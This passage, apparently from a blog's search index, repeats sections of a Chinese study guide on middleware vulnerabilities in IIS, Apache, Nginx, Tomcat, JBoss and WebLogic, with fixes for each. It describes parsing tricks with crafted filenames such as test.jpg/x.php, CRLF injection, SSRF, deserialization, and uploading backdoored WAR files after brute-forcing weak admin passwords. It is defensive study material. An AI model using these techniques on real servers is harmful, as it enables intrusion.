，该文件存在，便把该文件作为 php 程序执行了。 修复方法： 1）对新建目录文件名进行过滤，不允许新建包含‘.’的文件 2）曲线网站后台新建目录的功能，不允许新建目录 3）限制上传的脚本执行权限，不允许执行脚本 4）过滤.asp/xm.jpg，通过ISApi组件过滤 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:1","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#4解析漏洞"},{"categories":["hvv"],"content":"\r0x2 ApacheApache 是世界使用排名第一的Web 服务器软件。它可以运行在几乎所有广泛使用的 计算机平台上，由于其 跨平台 和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将 Perl/ Python等 解释器编译到服务器中。 1、解析漏洞Apache文件解析漏洞严格来说属于用户配置问题。 Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.tyoes内），则继续向左识别，当我们请求这样一个文件：shell.xxx.yyy yyy-\u003e无法识别，向左xxx-\u003e无法识别，向左 php-\u003e发现后缀是php，交给php处理这个文件 **修复方法：**将AddHandler application/x-httpd-php .php的配置文件删除。 2、目录遍历由于配置错误导致的目录遍历 修复方法： 修改apache配置文件httpd.conf 找到Options+Indexes+FollowSymLinks +ExecCGI并修改成 Options-Indexes+FollowSymLinks +ExecCGI 并保存； ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:2","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x2-apache"},{"categories":["hvv"],"content":"\r0x2 ApacheApache 是世界使用排名第一的Web 服务器软件。它可以运行在几乎所有广泛使用的 计算机平台上，由于其 跨平台 和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将 Perl/ Python等 解释器编译到服务器中。 1、解析漏洞Apache文件解析漏洞严格来说属于用户配置问题。 Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.tyoes内），则继续向左识别，当我们请求这样一个文件：shell.xxx.yyy yyy-\u003e无法识别，向左xxx-\u003e无法识别，向左 php-\u003e发现后缀是php，交给php处理这个文件 **修复方法：**将AddHandler application/x-httpd-php .php的配置文件删除。 2、目录遍历由于配置错误导致的目录遍历 修复方法： 修改apache配置文件httpd.conf 找到Options+Indexes+FollowSymLinks +ExecCGI并修改成 Options-Indexes+FollowSymLinks +ExecCGI 并保存； ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:2","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#1解析漏洞"},{"categories":["hvv"],"content":"\r0x2 ApacheApache 是世界使用排名第一的Web 服务器软件。它可以运行在几乎所有广泛使用的 计算机平台上，由于其 跨平台 和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将 Perl/ Python等 解释器编译到服务器中。 1、解析漏洞Apache文件解析漏洞严格来说属于用户配置问题。 Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.tyoes内），则继续向左识别，当我们请求这样一个文件：shell.xxx.yyy yyy-\u003e无法识别，向左xxx-\u003e无法识别，向左 php-\u003e发现后缀是php，交给php处理这个文件 **修复方法：**将AddHandler application/x-httpd-php .php的配置文件删除。 2、目录遍历由于配置错误导致的目录遍历 修复方法： 修改apache配置文件httpd.conf 找到Options+Indexes+FollowSymLinks +ExecCGI并修改成 Options-Indexes+FollowSymLinks +ExecCGI 并保存； ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:2","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#2目录遍历"},{"categories":["hvv"],"content":"\r0x3 NginxNginx 是一款 轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好 1、文件解析对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加test.jpg/x.php进行解析攻击。 修复方法： 1） 将php.ini文件中的cgi.fix_pathinfo的值设为0.这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404； 2） 将/etc/php5/fpm/pool.d/www.conf中security.limit_ectensions后面的值设为.php 2、目录遍历Nginx的目录遍历与Apache一样，属于配置方面的问题，错误的配置可到导致目录遍历与源码泄露。 修复方法： 将/etc/nginx/sites-avaliable/default里的autoindex on改为autoindex off 3、CRLF注入CRLF即“回车+换行”（\\r\\n） HTTP Header与HTTP Body时用两个CRLF分隔的，浏览器根据两个CRLF来取出HTTP内容并显示出来。 通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行。 修复方法： Nginx的配置文件/etc/nginx/conf.d/error1.conf修改为使用不解码的url跳转。 4、目录穿越Nginx反向代理，静态文件存储在/home/下，而访问时需要在url中输入files，配置文件中/files没有用/闭合，导致可以穿越至上层目录。 **修复方案：**Nginx的配置文件/etc/nginx/conf.d/error2.conf的/files使用/闭合。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:3","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x3-nginx"},{"categories":["hvv"],"content":"\r0x3 NginxNginx 是一款 轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好 1、文件解析对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加test.jpg/x.php进行解析攻击。 修复方法： 1） 将php.ini文件中的cgi.fix_pathinfo的值设为0.这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404； 2） 将/etc/php5/fpm/pool.d/www.conf中security.limit_ectensions后面的值设为.php 2、目录遍历Nginx的目录遍历与Apache一样，属于配置方面的问题，错误的配置可到导致目录遍历与源码泄露。 修复方法： 将/etc/nginx/sites-avaliable/default里的autoindex on改为autoindex off 3、CRLF注入CRLF即“回车+换行”（\\r\\n） HTTP Header与HTTP Body时用两个CRLF分隔的，浏览器根据两个CRLF来取出HTTP内容并显示出来。 通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行。 修复方法： Nginx的配置文件/etc/nginx/conf.d/error1.conf修改为使用不解码的url跳转。 4、目录穿越Nginx反向代理，静态文件存储在/home/下，而访问时需要在url中输入files，配置文件中/files没有用/闭合，导致可以穿越至上层目录。 **修复方案：**Nginx的配置文件/etc/nginx/conf.d/error2.conf的/files使用/闭合。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:3","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#1文件解析"},{"categories":["hvv"],"content":"\r0x3 NginxNginx 是一款 轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好 1、文件解析对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加test.jpg/x.php进行解析攻击。 修复方法： 1） 将php.ini文件中的cgi.fix_pathinfo的值设为0.这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404； 2） 将/etc/php5/fpm/pool.d/www.conf中security.limit_ectensions后面的值设为.php 2、目录遍历Nginx的目录遍历与Apache一样，属于配置方面的问题，错误的配置可到导致目录遍历与源码泄露。 修复方法： 将/etc/nginx/sites-avaliable/default里的autoindex on改为autoindex off 3、CRLF注入CRLF即“回车+换行”（\\r\\n） HTTP Header与HTTP Body时用两个CRLF分隔的，浏览器根据两个CRLF来取出HTTP内容并显示出来。 通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行。 修复方法： Nginx的配置文件/etc/nginx/conf.d/error1.conf修改为使用不解码的url跳转。 4、目录穿越Nginx反向代理，静态文件存储在/home/下，而访问时需要在url中输入files，配置文件中/files没有用/闭合，导致可以穿越至上层目录。 **修复方案：**Nginx的配置文件/etc/nginx/conf.d/error2.conf的/files使用/闭合。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:3","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#2目录遍历-1"},{"categories":["hvv"],"content":"\r0x3 NginxNginx 是一款 轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好 1、文件解析对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加test.jpg/x.php进行解析攻击。 修复方法： 1） 将php.ini文件中的cgi.fix_pathinfo的值设为0.这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404； 2） 将/etc/php5/fpm/pool.d/www.conf中security.limit_ectensions后面的值设为.php 2、目录遍历Nginx的目录遍历与Apache一样，属于配置方面的问题，错误的配置可到导致目录遍历与源码泄露。 修复方法： 将/etc/nginx/sites-avaliable/default里的autoindex on改为autoindex off 3、CRLF注入CRLF即“回车+换行”（\\r\\n） HTTP Header与HTTP Body时用两个CRLF分隔的，浏览器根据两个CRLF来取出HTTP内容并显示出来。 通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行。 修复方法： Nginx的配置文件/etc/nginx/conf.d/error1.conf修改为使用不解码的url跳转。 4、目录穿越Nginx反向代理，静态文件存储在/home/下，而访问时需要在url中输入files，配置文件中/files没有用/闭合，导致可以穿越至上层目录。 **修复方案：**Nginx的配置文件/etc/nginx/conf.d/error2.conf的/files使用/闭合。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:3","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#3crlf注入"},{"categories":["hvv"],"content":"\r0x3 NginxNginx 是一款 轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好 1、文件解析对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加test.jpg/x.php进行解析攻击。 修复方法： 1） 将php.ini文件中的cgi.fix_pathinfo的值设为0.这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404； 2） 将/etc/php5/fpm/pool.d/www.conf中security.limit_ectensions后面的值设为.php 2、目录遍历Nginx的目录遍历与Apache一样，属于配置方面的问题，错误的配置可到导致目录遍历与源码泄露。 修复方法： 将/etc/nginx/sites-avaliable/default里的autoindex on改为autoindex off 3、CRLF注入CRLF即“回车+换行”（\\r\\n） HTTP Header与HTTP Body时用两个CRLF分隔的，浏览器根据两个CRLF来取出HTTP内容并显示出来。 通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行。 修复方法： Nginx的配置文件/etc/nginx/conf.d/error1.conf修改为使用不解码的url跳转。 4、目录穿越Nginx反向代理，静态文件存储在/home/下，而访问时需要在url中输入files，配置文件中/files没有用/闭合，导致可以穿越至上层目录。 **修复方案：**Nginx的配置文件/etc/nginx/conf.d/error2.conf的/files使用/闭合。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:3","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#4目录穿越"},{"categories":["hvv"],"content":"\r0x4 TomcatTomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。 可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。 实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。 1、远程代码执行Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。 影响版本： Apache Tomcat 7.0.0 – 7.0.81 修复方法： 1）检测当前版本是否在影响范围内，并禁用PUT方法。 2）更新并升级至最新版。 2、war后门文件部署Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。 若后台管理页面存在弱口令，则可以通过爆破获取密码。 修复方法： 1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。 2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。 3）以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。 4）后台管理避免弱口令。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:4","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x4-tomcat"},{"categories":["hvv"],"content":"\r0x4 TomcatTomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。 可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。 实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。 1、远程代码执行Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。 影响版本： Apache Tomcat 7.0.0 – 7.0.81 修复方法： 1）检测当前版本是否在影响范围内，并禁用PUT方法。 2）更新并升级至最新版。 2、war后门文件部署Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。 若后台管理页面存在弱口令，则可以通过爆破获取密码。 修复方法： 1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。 2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。 3）以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。 4）后台管理避免弱口令。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:4","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#1远程代码执行"},{"categories":["hvv"],"content":"\r0x4 TomcatTomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。 可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。 实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。 1、远程代码执行Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。 影响版本： Apache Tomcat 7.0.0 – 7.0.81 修复方法： 1）检测当前版本是否在影响范围内，并禁用PUT方法。 2）更新并升级至最新版。 2、war后门文件部署Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。 若后台管理页面存在弱口令，则可以通过爆破获取密码。 修复方法： 1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。 2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。 3）以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。 4）后台管理避免弱口令。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:4","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#2war后门文件部署"},{"categories":["hvv"],"content":"\r0x5 jBossjBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。 1、反序列化漏洞Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。 修复方法： 有效解决方案：升级到JBOSS AS7版本临时解决方案： 1）不需要http-invoker.sar 组件的用户可直接删除此组件； 2）用于对 httpinvoker 组件进行访问控制。 2、war后门文件部署jBoss后台管理页面存在弱口令，通过爆破获得账号密码。登陆后台上传包含后门的war包。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:5","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x5-jboss"},{"categories":["hvv"],"content":"\r0x5 jBossjBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。 1、反序列化漏洞Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。 修复方法： 有效解决方案：升级到JBOSS AS7版本临时解决方案： 1）不需要http-invoker.sar 组件的用户可直接删除此组件； 2）用于对 httpinvoker 组件进行访问控制。 2、war后门文件部署jBoss后台管理页面存在弱口令，通过爆破获得账号密码。登陆后台上传包含后门的war包。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:5","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#1反序列化漏洞"},{"categories":["hvv"],"content":"\r0x5 jBossjBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。 1、反序列化漏洞Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。 修复方法： 有效解决方案：升级到JBOSS AS7版本临时解决方案： 1）不需要http-invoker.sar 组件的用户可直接删除此组件； 2）用于对 httpinvoker 组件进行访问控制。 2、war后门文件部署jBoss后台管理页面存在弱口令，通过爆破获得账号密码。登陆后台上传包含后门的war包。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:5","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#2war后门文件部署-1"},{"categories":["hvv"],"content":"\r0x6 WebLogicWebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 1、反序列化漏洞Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。 修复方法： 1）升级Oracle 10月份补丁。 2）对访问wls-wsat的资源进行访问控制。 2、SSRFWeblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。 修复方法： 方法一： 以修复的直接方法是将SearchPublicRegistries.jsp直接删除就好了； 方法二： 1）删除uddiexplorer文件夹 2）限制uddiexplorer应用只能内网访问 方法三：（常用） Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），更准确地说是uudi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。方法二采用的是改后辍的方式，修复步骤如下： 1）将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份 2）将weblogic安装目录下的server/lib/uddiexplorer.war下载 3）用winrar等工具打开uddiexplorer.war 4)将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx 5）保存后上传回服务端替换原先的uddiexplorer.war 6）对于多台主机组成的集群，针对每台主机都要做这样的操作 7）由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用—停server—停控制台—启控制台—启server—启应用） 3、任意文件上传通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。 修复方法： 方案1： 使用Oracle官方通告中的补丁链接： http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html https://support.oracle.com/rs?type=doc\u0026id=2394520.1 方案2: 1）进入Weblogic Server管理控制台； 2）domain设置中，启用”生产模式”。 4、war后门文件部署由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。 修复方法： 防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:6","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x6-weblogic"},{"categories":["hvv"],"content":"\r0x6 WebLogicWebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 1、反序列化漏洞Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。 修复方法： 1）升级Oracle 10月份补丁。 2）对访问wls-wsat的资源进行访问控制。 2、SSRFWeblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。 修复方法： 方法一： 以修复的直接方法是将SearchPublicRegistries.jsp直接删除就好了； 方法二： 1）删除uddiexplorer文件夹 2）限制uddiexplorer应用只能内网访问 方法三：（常用） Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），更准确地说是uudi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。方法二采用的是改后辍的方式，修复步骤如下： 1）将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份 2）将weblogic安装目录下的server/lib/uddiexplorer.war下载 3）用winrar等工具打开uddiexplorer.war 4)将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx 5）保存后上传回服务端替换原先的uddiexplorer.war 6）对于多台主机组成的集群，针对每台主机都要做这样的操作 7）由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用—停server—停控制台—启控制台—启server—启应用） 3、任意文件上传通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。 修复方法： 方案1： 使用Oracle官方通告中的补丁链接： http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html https://support.oracle.com/rs?type=doc\u0026id=2394520.1 方案2: 1）进入Weblogic Server管理控制台； 2）domain设置中，启用”生产模式”。 4、war后门文件部署由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。 修复方法： 防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:6","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#1反序列化漏洞-1"},{"categories":["hvv"],"content":"\r0x6 WebLogicWebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 1、反序列化漏洞Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。 修复方法： 1）升级Oracle 10月份补丁。 2）对访问wls-wsat的资源进行访问控制。 2、SSRFWeblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。 修复方法： 方法一： 以修复的直接方法是将SearchPublicRegistries.jsp直接删除就好了； 方法二： 1）删除uddiexplorer文件夹 2）限制uddiexplorer应用只能内网访问 方法三：（常用） Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），更准确地说是uudi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。方法二采用的是改后辍的方式，修复步骤如下： 1）将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份 2）将weblogic安装目录下的server/lib/uddiexplorer.war下载 3）用winrar等工具打开uddiexplorer.war 4)将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx 5）保存后上传回服务端替换原先的uddiexplorer.war 6）对于多台主机组成的集群，针对每台主机都要做这样的操作 7）由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用—停server—停控制台—启控制台—启server—启应用） 3、任意文件上传通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。 修复方法： 方案1： 使用Oracle官方通告中的补丁链接： http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html https://support.oracle.com/rs?type=doc\u0026id=2394520.1 方案2: 1）进入Weblogic Server管理控制台； 2）domain设置中，启用”生产模式”。 4、war后门文件部署由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。 修复方法： 防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:6","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#2ssrf"},{"categories":["hvv"],"content":"\r0x6 WebLogicWebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 1、反序列化漏洞Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。 修复方法： 1）升级Oracle 10月份补丁。 2）对访问wls-wsat的资源进行访问控制。 2、SSRFWeblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。 修复方法： 方法一： 以修复的直接方法是将SearchPublicRegistries.jsp直接删除就好了； 方法二： 1）删除uddiexplorer文件夹 2）限制uddiexplorer应用只能内网访问 方法三：（常用） Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），更准确地说是uudi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。方法二采用的是改后辍的方式，修复步骤如下： 1）将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份 2）将weblogic安装目录下的server/lib/uddiexplorer.war下载 3）用winrar等工具打开uddiexplorer.war 4)将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx 5）保存后上传回服务端替换原先的uddiexplorer.war 6）对于多台主机组成的集群，针对每台主机都要做这样的操作 7）由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用—停server—停控制台—启控制台—启server—启应用） 3、任意文件上传通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。 修复方法： 方案1： 使用Oracle官方通告中的补丁链接： http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html https://support.oracle.com/rs?type=doc\u0026id=2394520.1 方案2: 1）进入Weblogic Server管理控制台； 2）domain设置中，启用”生产模式”。 4、war后门文件部署由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。 修复方法： 防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:6","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#3任意文件上传"},{"categories":["hvv"],"content":"\r0x6 WebLogicWebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java 